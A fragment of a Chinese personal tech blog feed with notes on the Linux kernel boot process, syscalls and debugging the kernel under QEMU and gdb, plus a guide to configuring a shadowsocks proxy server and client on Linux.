<h2 id="2-黑客入侵终端模拟"><a href="#2-黑客入侵终端模拟" class="headerlink" title="2. 黑客入侵终端模拟"></a>2. 黑客入侵终端模拟</h2><ul>
<li>使用<code>hollywood</code>，安装后使用tmux执行即可</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux kernel源码学习记录</title>
    <url>/blogs/2021-03-22-linux-kernel/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>本文为研究linux kernel源码所记录的一些笔记</p>
<p>源码下载路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mirrors.edge.kernel.org/pub/linux/kernel/</span><br></pre></td></tr></table></figure>

<p>由于篇幅问题，后续更新放在 <a href="/bookPages/docs/linux-kernel/">linux内核源码分析记录</a></p>
<h1 id="二、linux启动过程"><a href="#二、linux启动过程" class="headerlink" title="二、linux启动过程"></a>二、linux启动过程</h1><h2 id="1-从引导加载程序内核"><a href="#1-从引导加载程序内核" class="headerlink" title="1. 从引导加载程序内核"></a>1. 从引导加载程序内核</h2><h3 id="1-1-cpu上电"><a href="#1-1-cpu上电" class="headerlink" title="1.1. cpu上电"></a>1.1. cpu上电</h3><ol>
<li>主板通电后，会启动cpu</li>
<li>cpu启动复位后，开始在实模式下工作</li>
</ol>
<ul>
<li>所有x86兼容处理器均支持实模式</li>
</ul>
<ol start="3">
<li>启动后开始从地址<code>0xfffffff0</code>执行第一条指令，这个地址被放置了BIOS的入口</li>
<li>但是实模式下只有16位寄存器，不能索引到上面的地址。其实这个地址被映射到了rom中</li>
<li>ROM中存放各个硬件厂商定制的BIOS或者UEFI的启动代码，用于找到硬盘并引导系统启动</li>
</ol>
<h3 id="1-2-bios启动"><a href="#1-2-bios启动" class="headerlink" title="1.2. bios启动"></a>1.2. bios启动</h3><p><strong>UEFI和BIOS的区别</strong></p>
<p>BIOS启动流程：</p>
<ul>
<li>系统开机</li>
<li>上电自检（Power On Self Test 或 POST）。POST过后初始化用于启动的硬件（磁盘、键盘控制器等）</li>
<li>BIOS会运行BIOS磁盘启动顺序中第一个磁盘的首440bytes（MBR启动代码区域）内的代码。</li>
<li>启动引导代码从BIOS获得控制权，然后引导启动下一阶段的代码（如果有的话）（一般是系统的启动引导代码）。</li>
<li>再次被启动的代码（二阶段代码）（即启动引导）会查阅支持和配置文件。根据配置文件中的信息，启动引导程序会将内核和initramfs文件载入系统的RAM中，然后开始启动内核。</li>
</ul>
<p>UEFI启动流程：</p>
<ul>
<li>系统开机</li>
<li>上电自检（Power On Self Test 或 POST）。UEFI 固件被加载，并由它初始化启动要用的硬件。</li>
<li>固件读取其引导管理器以确定从何处（比如，从哪个硬盘及分区）加载哪个 UEFI 应用。</li>
<li>固件按照引导管理器中的启动项目，加载UEFI 应用。</li>
<li>已启动的 UEFI 应用还可以启动其他应用（对应于 UEFI shell 或 rEFInd 之类的引导管理器的情况）或者启动内核及initramfs（对应于GRUB之类引导器的情况），这取决于 UEFI 应用的配置。</li>
</ul>
<p><strong>MBT和GPT</strong></p>
<p>MBR</p>
<ol>
<li>bios在初始化和检查硬件之后，需要找一个可引导设备<ol>
<li>初始可引导设备列表存在bios配置中，根据顺序一个一个找</li>
</ol>
</li>
<li>对于硬盘，引导扇区在第一个扇区（512字节）的头446字节，并且引导扇区最后必须是<code>0x55</code>和<code>0xaa</code>，这两个字节可以称为魔术字节，如果bios看到这两个字节，认为这个设备是可引导设备，这个也是MBR硬盘的第一个扇区的构成</li>
<li>在实模式下，内存的组成如下，所以我们写bootloader程序需要加载到<code>0x7c00</code>，如果需要操作显示，需要写入到<code>0xa0000 ~ 0xbffff</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00000000 - 0x000003FF - Real Mode Interrupt Vector Table</span><br><span class="line">0x00000400 - 0x000004FF - BIOS Data Area</span><br><span class="line">0x00000500 - 0x00007BFF - Unused</span><br><span class="line">0x00007C00 - 0x00007DFF - Our Bootloader</span><br><span class="line">0x00007E00 - 0x0009FFFF - Unused</span><br><span class="line">0x000A0000 - 0x000BFFFF - Video RAM (VRAM) Memory</span><br><span class="line">0x000B0000 - 0x000B7777 - Monochrome Video Memory</span><br><span class="line">0x000B8000 - 0x000BFFFF - Color Video Memory</span><br><span class="line">0x000C0000 - 0x000C7FFF - Video ROM BIOS</span><br><span class="line">0x000C8000 - 0x000EFFFF - BIOS Shadow Area</span><br><span class="line">0x000F0000 - 0x000FFFFF - System BIOS</span><br></pre></td></tr></table></figure>

<ul>
<li>linux kernel启动函数（main函数）并不是常规的main，是<code>init/main.c</code>里面的<code>start_kernel()</code>函数</li>
</ul>
<h1 id="三、数据结构"><a href="#三、数据结构" class="headerlink" title="三、数据结构"></a>三、数据结构</h1><h2 id="1-公共机制"><a href="#1-公共机制" class="headerlink" title="1. 公共机制"></a>1. 公共机制</h2><h3 id="1-1-container-of-根据数据结构节点找value"><a href="#1-1-container-of-根据数据结构节点找value" class="headerlink" title="1.1. container_of 根据数据结构节点找value"></a>1.1. <code>container_of</code> 根据数据结构节点找value</h3><p><a href="/bookPages/docs/linux-kernel/data-structures/container_of/">container_of</a></p>
<h2 id="2-rbtree"><a href="#2-rbtree" class="headerlink" title="2. rbtree"></a>2. rbtree</h2><p><a href="/bookPages/docs/linux-kernel/data-structures/rbtree/">rbtree</a></p>
<h2 id="3-rcu-读拷贝更新"><a href="#3-rcu-读拷贝更新" class="headerlink" title="3. rcu 读拷贝更新"></a>3. rcu 读拷贝更新</h2><p><a href="/bookPages/docs/linux-kernel/data-structures/rcu/">rcu</a></p>
<h1 id="四、系统调用"><a href="#四、系统调用" class="headerlink" title="四、系统调用"></a>四、系统调用</h1><h2 id="1-网络相关"><a href="#1-网络相关" class="headerlink" title="1. 网络相关"></a>1. 网络相关</h2><h3 id="1-1-epoll"><a href="#1-1-epoll" class="headerlink" title="1.1. epoll"></a>1.1. epoll</h3><p><a href="/bookPages/docs/linux-kernel/net/epoll/">epoll</a></p>
<h3 id="1-2-bind-绑定地址到socket"><a href="#1-2-bind-绑定地址到socket" class="headerlink" title="1.2. bind 绑定地址到socket"></a>1.2. bind 绑定地址到socket</h3><h4 id="1-接口定义"><a href="#1-接口定义" class="headerlink" title="1) 接口定义"></a>1) 接口定义</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// net/socket.c</span></span><br><span class="line"><span class="built_in">SYSCALL_DEFINE3</span>(bind, <span class="type">int</span>, fd, <span class="keyword">struct</span> sockaddr __user *, umyaddr, <span class="type">int</span>, addrlen)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __sys_bind(fd, umyaddr, addrlen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-unix套接字"><a href="#1-3-unix套接字" class="headerlink" title="1.3. unix套接字"></a>1.3. unix套接字</h3><p>源码主要看<code>net/unix/af_unix.c</code></p>
<ul>
<li>unix套接字仅支持<code>SOCK_STREAM</code>、<code>SOCK_RAW</code>、<code>SOCK_DGRAM</code>、<code>SOCK_SEQPACKET</code>这几种type，源码看<code>unix_create()</code></li>
<li>使用unix套接字，protocol参数必须为<code>0</code>，原因查看<code>unix_create()</code>的第一个判断</li>
</ul>
<h2 id="2-文件相关"><a href="#2-文件相关" class="headerlink" title="2. 文件相关"></a>2. 文件相关</h2><h3 id="2-1-监听文件变化-inotify"><a href="#2-1-监听文件变化-inotify" class="headerlink" title="2.1. 监听文件变化 inotify"></a>2.1. 监听文件变化 inotify</h3><p><a href="/bookPages/docs/linux-kernel/fs/inotify/">inotify</a></p>
<h1 id="五、底层的几个机制"><a href="#五、底层的几个机制" class="headerlink" title="五、底层的几个机制"></a>五、底层的几个机制</h1><h2 id="1-惊群现象和处理"><a href="#1-惊群现象和处理" class="headerlink" title="1. 惊群现象和处理"></a>1. 惊群现象和处理</h2><p>参考 <a href="https://zhuanlan.zhihu.com/p/385410196">深入浅出 Linux 惊群：现象、原因和解决方案</a></p>
<ul>
<li>在linux的2.6.x已经解决，底层仅会唤起一个进程进行处理</li>
</ul>
<h1 id="六、编译内核"><a href="#六、编译内核" class="headerlink" title="六、编译内核"></a>六、编译内核</h1><h2 id="1-编译过程"><a href="#1-编译过程" class="headerlink" title="1. 编译过程"></a>1. 编译过程</h2><h3 id="1-1-配置"><a href="#1-1-配置" class="headerlink" title="1.1. 配置"></a>1.1. 配置</h3><h3 id="1-2-编译"><a href="#1-2-编译" class="headerlink" title="1.2. 编译"></a>1.2. 编译</h3><h3 id="1-3-安装"><a href="#1-3-安装" class="headerlink" title="1.3. 安装"></a>1.3. 安装</h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1) 安装"></a>1) 安装</h4><h4 id="2-安装模块"><a href="#2-安装模块" class="headerlink" title="2) 安装模块"></a>2) 安装模块</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">INSTALL_MOD_PATH指定安装的根目录位置，会自动安装到此目录下的lib/modules/&lt;<span class="built_in">arch</span>&gt;下</span></span><br><span class="line">make modules_install INSTALL_MOD_PATH=/home/wangyubo/vmware/linux-5.19/fs</span><br></pre></td></tr></table></figure>

<h2 id="2-选项解释"><a href="#2-选项解释" class="headerlink" title="2. 选项解释"></a>2. 选项解释</h2><h3 id="2-1-基础知识"><a href="#2-1-基础知识" class="headerlink" title="2.1. 基础知识"></a>2.1. 基础知识</h3><h4 id="1-模块编译选项"><a href="#1-模块编译选项" class="headerlink" title="1) 模块编译选项"></a>1) 模块编译选项</h4><ul>
<li>内核编译选项中，前面是<code>&lt;*&gt;</code>代表编译进内核</li>
<li><code>&lt;M&gt;</code>代表编译成模块</li>
</ul>
<h1 id="七、调试内核"><a href="#七、调试内核" class="headerlink" title="七、调试内核"></a>七、调试内核</h1><p>参考 <a href="https://zhuanlan.zhihu.com/p/499637419">QEMU调试Linux内核环境搭建</a></p>
<h2 id="1-编译内核"><a href="#1-编译内核" class="headerlink" title="1. 编译内核"></a>1. 编译内核</h2><ul>
<li>下载内核源码<code>https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.19.1.tar.gz</code></li>
<li>解压后进入目录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建默认配置</span></span><br><span class="line">make x86_64_defconfig</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入menu配置模式</span></span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<ul>
<li>修改下述配置，开启debug，关闭地址随机化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Kernel hacking  ---&gt;</span><br><span class="line">    [*] Kernel debugging</span><br><span class="line">    Compile-time checks and compiler options  ---&gt;</span><br><span class="line">        [*] Compile the kernel with debug info</span><br><span class="line">        [*]   Provide GDB scripts for kernel debuggin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Processor type and features ----&gt;</span><br><span class="line">    [] Randomize the address of the kernel image (KASLR)</span><br></pre></td></tr></table></figure>

<ul>
<li>编译</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make -j 20</span><br></pre></td></tr></table></figure>

<h3 id="1-1-想要某个函数不优化"><a href="#1-1-想要某个函数不优化" class="headerlink" title="1.1. 想要某个函数不优化"></a>1.1. 想要某个函数不优化</h3><ul>
<li>给单个函数添加<code>__attribute__((optimize(&quot;O0&quot;)))</code></li>
<li>如，不优化<code>static int ip_rcv_finish(struct net *net, struct sock *sk, struct sk_buff *skb)</code>就写成下面这样</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">ip_rcv_finish</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> sk_buff *skb)</span> __<span class="title">attribute__</span><span class="params">((optimize(<span class="string">&quot;O0&quot;</span>)))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ip_rcv_finish</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> sk_buff *skb)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-构建根文件系统"><a href="#2-构建根文件系统" class="headerlink" title="2. 构建根文件系统"></a>2. 构建根文件系统</h2><ul>
<li>这里选择ubuntu的根文件系统 <code>http://cdimage.ubuntu.com/ubuntu-base/releases/22.04/release/ubuntu-base-22.04-base-amd64.tar.gz</code></li>
<li>创建镜像并mount</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建10G根镜像文件</span></span><br><span class="line">fallocate -l 10G rootfs.img</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式化为ext4</span></span><br><span class="line">mkfs.ext4 rootfs.img</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">挂载到一个目录下</span></span><br><span class="line">sudo mount -t ext4 -o loop rootfs.img ./fs</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压根文件系统到目录下</span></span><br><span class="line">sudo tar -xzvf ubuntu-base-22.04-base-amd64.tar.gz -C ./fs</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改resolv.conf</span></span><br><span class="line">cp /etc/resolv.conf ./fs/etc/resolv.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改镜像源</span></span><br><span class="line">vim ./fs/etc/apt/sources.list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改权限</span></span><br><span class="line">sudo chown -R root:root ./fs</span><br><span class="line">sudo chmod -R 777 ./fs</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">挂载dev到目录下（不然无法操作/dev/null）</span></span><br><span class="line">sudo mount -o bind /dev fs/dev</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">chroot</span>上去</span></span><br><span class="line">sudo chroot ./fs</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新软件源</span></span><br><span class="line">apt update</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装必要的软件</span></span><br><span class="line">apt install vim gcc tmux g++ make cmake openssh-server wireless-tools</span><br><span class="line">apt install net-tools     # ifconfig</span><br><span class="line">apt install iputils-ping  # ping</span><br><span class="line">apt install ifupdown      # ip</span><br><span class="line">apt install network-manager</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动NetworkManager</span></span><br><span class="line">systemctl enable NetworkManager</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改root密码</span></span><br><span class="line">passwd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">退出后umount</span></span><br><span class="line">exit</span><br><span class="line">sudo umount ./fs/dev</span><br><span class="line">sudo umount ./fs</span><br></pre></td></tr></table></figure>

<h2 id="3-起系统"><a href="#3-起系统" class="headerlink" title="3. 起系统"></a>3. 起系统</h2><ul>
<li><code>-s</code>: 相当于<code>-gdb tcp::1234</code>，在1234启用gdb调试</li>
<li><code>-append &quot;root=/dev/sda rw console=ttyS0&quot;</code>: root使用sda，要rw否则会只读；console设置输出到当前控制台</li>
<li>使用<code>spice://127.0.0.1:5900</code>可以看到画面</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 -enable-kvm -m 4G -smp 1 -kernel /path/to/kernel/source/arch/x86_64/boot/bzImage -hda rootfs.img -drive format=raw -append &quot;root=/dev/sda rw console=ttyS0&quot; -nographic -s -spice port=5900,disable-ticketing=on</span><br></pre></td></tr></table></figure>

<ul>
<li>配置网络，因为没有设置网卡，所以使用的是qemu自己模拟的用户态网络，配置网络dhcp获取即可</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接</span></span><br><span class="line">=&gt; nmcli conn show</span><br><span class="line">NAME    UUID                                  TYPE      DEVICE</span><br><span class="line">enp0s3  9a364675-b60a-479a-8d4a-754bab3dfe01  ethernet  enp0s3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置dhcp获取ip</span></span><br><span class="line">=&gt; nmcli conn add type ethernet con-name enp0s3-dhcp ifname enp0s3 ipv4.method auto</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除连接</span></span><br><span class="line">=&gt; nmcli conn delete enp0s3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接</span></span><br><span class="line">=&gt; nmcli conn show</span><br><span class="line">NAME          UUID                                  TYPE      DEVICE</span><br><span class="line">enp0s3-dhcp   9a364675-b60a-479a-8d4a-754bab3dfe01  ethernet  --</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用连接</span></span><br><span class="line">=&gt; nmcli conn up enp0s3-dhcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接</span></span><br><span class="line">=&gt; nmcli conn show</span><br><span class="line">NAME          UUID                                  TYPE      DEVICE</span><br><span class="line">enp0s3-dhcp   9a364675-b60a-479a-8d4a-754bab3dfe01  ethernet  enp0s3</span><br></pre></td></tr></table></figure>

<ul>
<li>共享磁盘在<code>/dev/sdb</code>，自己看着挂载就好了</li>
</ul>
<h2 id="4-gdb调试"><a href="#4-gdb调试" class="headerlink" title="4. gdb调试"></a>4. gdb调试</h2><h3 id="4-1-命令行调试"><a href="#4-1-命令行调试" class="headerlink" title="4.1. 命令行调试"></a>4.1. 命令行调试</h3><ul>
<li>到linux内核编译的目录下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; gdb vmlinux</span><br><span class="line">...</span><br><span class="line">(gdb) target remote localhost:1234</span><br><span class="line">Remote debugging using localhost:1234</span><br></pre></td></tr></table></figure>

<h3 id="4-2-vscode调试"><a href="#4-2-vscode调试" class="headerlink" title="4.2. vscode调试"></a>4.2. vscode调试</h3><ul>
<li>vscode打开源码目录</li>
<li>配置<code>launch.json</code></li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// Use IntelliSense to learn about possible attributes.</span></span><br><span class="line">    <span class="comment">// Hover to view descriptions of existing attributes.</span></span><br><span class="line">    <span class="comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;(gdb) launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/vmlinux&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:1234&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Enable pretty-printing for gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Set Disassembly Flavor to Intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-gdb-set disassembly-flavor intel&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下shadowsocks代理配置（服务端+客户端）</title>
    <url>/blogs/2021-03-05-shadowsocks/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文梳理linux上使用shadowsocks的一些方法和坑</p>
<h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><ul>
<li>shadowsocks服务端和客户端都可以使用python3-pip进行安装，比较方便</li>
<li>最好用管理员权限装，可以所有用户使用，否则只会装到<code>$&#123;HOME&#125;/.local/bin</code>下面</li>
<li>注意python版本尽量选择<code>3.8</code>左右，<code>3.10</code>存在另外的问题</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pip3 install shadowsocks</span><br></pre></td></tr></table></figure>

<h1 id="二、服务端配置"><a href="#二、服务端配置" class="headerlink" title="二、服务端配置"></a>二、服务端配置</h1><ul>
<li>编写<code>/etc/shadowsocks.json</code>文件，也可以自己定义</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;port_password&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;1234&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxxx&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="number">600</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aes-256-cfb&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>配置都能看懂，就不详细说明了</li>
<li>用下面的命令使用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json start</span><br></pre></td></tr></table></figure>

<h2 id="1-开机启动服务"><a href="#1-开机启动服务" class="headerlink" title="1. 开机启动服务"></a>1. 开机启动服务</h2><ul>
<li>编写<code>/usr/lib/systemd/system/ssserver.service</code></li>
<li>使用绝对路径防止没有加载PATH环境变量</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Shadowsocks server</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">User</span>=root</span><br><span class="line"><span class="attr">Group</span>=root</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/local/bin/ssserver -c /etc/shadowsocks.json start</span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">on</span>-failure</span><br></pre></td></tr></table></figure>

<ul>
<li>调用<code>sudo systemctl enable ssserver</code>来添加开机启动项</li>
<li>调用<code>sudo service ssserver start</code>来启动服务</li>
</ul>
<h1 id="三、客户端使用"><a href="#三、客户端使用" class="headerlink" title="三、客户端使用"></a>三、客户端使用</h1><p>客户端可以使用sslocal命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; sslocal -h</span><br><span class="line">usage: sslocal [OPTION]...</span><br><span class="line">A fast tunnel proxy that helps you bypass firewalls.</span><br><span class="line"></span><br><span class="line">You can supply configurations via either config file or command line arguments.</span><br><span class="line"></span><br><span class="line">Proxy options:</span><br><span class="line">  -c CONFIG              path to config file</span><br><span class="line">  -s SERVER_ADDR         server address</span><br><span class="line">  -p SERVER_PORT         server port, default: 8388</span><br><span class="line">  -b LOCAL_ADDR          local binding address, default: 127.0.0.1</span><br><span class="line">  -l LOCAL_PORT          local port, default: 1080</span><br><span class="line">  -k PASSWORD            password</span><br><span class="line">  -m METHOD              encryption method, default: aes-256-cfb</span><br><span class="line">  -t TIMEOUT             timeout in seconds, default: 300</span><br><span class="line">  --fast-open            use TCP_FASTOPEN, requires Linux 3.7+</span><br><span class="line"></span><br><span class="line">General options:</span><br><span class="line">  -h, --help             show this help message and exit</span><br><span class="line">  -d start/stop/restart  daemon mode</span><br><span class="line">  --pid-file PID_FILE    pid file for daemon mode</span><br><span class="line">  --log-file LOG_FILE    log file for daemon mode</span><br><span class="line">  --user USER            username to run as</span><br><span class="line">  -v, -vv                verbose mode</span><br><span class="line">  -q, -qq                quiet mode, only show warnings/errors</span><br><span class="line">  --version              show version information</span><br></pre></td></tr></table></figure>

<ul>
<li>配置</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.242.8.24&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;server_port&quot;</span><span class="punctuation">:</span> <span class="number">8889</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-开机自启动"><a href="#1-开机自启动" class="headerlink" title="1. 开机自启动"></a>1. 开机自启动</h2><p>同样编写<code>/usr/lib/systemd/system/sslocal.service</code></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=Shadowsocks client</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">User</span>=root</span><br><span class="line"><span class="attr">Group</span>=root</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/local/bin/sslocal -c /etc/shadowsocks.json</span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">on</span>-failure</span><br></pre></td></tr></table></figure>

<ul>
<li><code>sudo systemctl enable sslocal</code>添加开机启动项</li>
<li><code>sudo service sslocal start</code>启动服务</li>
</ul>
<h2 id="2-代理设置"><a href="#2-代理设置" class="headerlink" title="2. 代理设置"></a>2. 代理设置</h2><ul>
<li>上面客户端启用仅仅是监听了1080端口做socks5代理，想要使用还需要做处理</li>
</ul>
<h3 id="2-1-proxychains做socks5代理"><a href="#2-1-proxychains做socks5代理" class="headerlink" title="2.1. proxychains做socks5代理"></a>2.1. proxychains做socks5代理</h3><ul>
<li>如果系统支持socks5代理，可以使用<code>export http_proxy=&quot;socks5://127.0.0.1:1080&quot;</code></li>
<li>不支持可以使用proxychains做命令行代理</li>
<li>还有部分命令，即使设置了proxy就是不走代理，那么使用proxychains治治他们的脾气</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install proxychains</span><br></pre></td></tr></table></figure>

<p><strong>配置</strong></p>
<ul>
<li>修改<code>/etc/proxychains.conf</code></li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[ProxyList]</span></span><br><span class="line"><span class="comment"># 新增</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>

<p><strong>使用</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains -q git clone xxx</span><br></pre></td></tr></table></figure>

<h3 id="2-2-privoxy做http代理"><a href="#2-2-privoxy做http代理" class="headerlink" title="2.2. privoxy做http代理"></a>2.2. privoxy做http代理</h3><ul>
<li>很多情况使用socks5不能代理，需要使用http代理</li>
<li>可以安装privoxy来讲socks5转成http代理</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt intall privoxy</span><br></pre></td></tr></table></figure>

